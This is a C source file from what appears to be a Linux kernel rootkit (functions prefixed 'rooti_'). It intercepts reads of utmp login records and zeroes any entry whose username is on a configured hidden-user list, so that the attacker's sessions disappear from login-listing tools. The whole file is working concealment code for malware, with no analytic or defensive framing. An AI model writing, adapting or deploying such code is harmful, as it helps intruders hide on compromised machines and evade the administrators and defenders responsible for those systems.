#include <linux/types.h>
#include <linux/string.h>
#include "utmp.h"
#include "login.h"
#include "../../utils.h"
#include "../../config.h"

// Determines whether the user should be hidden or not, by username
static bool rooti_should_hide_user(char *username)
{
    for (int i = 0; i < ROOTI_HIDDEN_USERS_COUNT; i++) {
        if (strncmp(username, ROOTI_HIDDEN_USERS[i], UT_NAMESIZE) == 0) {
            return true;
        }
    }
    return false;
}

/*
    Rigs the record returned from the utmp file, hiding the record if the user should be hidden.
    This is achieved by copying the results into kernel space, filling the buffer with zeros and
    returning the rigged results back into user space.
*/
int rooti_hide_login_entry(char *user_buf, size_t count)
{
    // Allocate a kernel buffer to store the data returned to user
    char *kernel_buf = kmalloc(count, GFP_KERNEL);
    if (kernel_buf == NULL) {
        ROOTI_DEBUG("failed to allocate memory");
        return -ENOMEM;
    }

    // Copy the results into our kernel buffer
    int err = copy_from_user(kernel_buf, user_buf, count);
    if (err > 0) {
        ROOTI_DEBUG("copy_from_user() failed: %d", err);
        kfree(kernel_buf);
        return -EFAULT;
    }

    // Check if the username contained the in the record is of a user that should be hidden
    struct utmp *utmp_buf = (struct utmp *)kernel_buf;
    if (rooti_should_hide_user(utmp_buf->ut_user)) {
        // Match found, fill the buffer with zeros, marking it as invalid
        memset(kernel_buf, 0, count);
        // Copy the results back to user space
        err = copy_to_user(user_buf, kernel_buf, count);
        if (err > 0) {
            ROOTI_DEBUG("copy_to_user() failed: %d", err);
            kfree(kernel_buf);
            return -EFAULT;
        }
    }

    kfree(kernel_buf);
    return 0;
}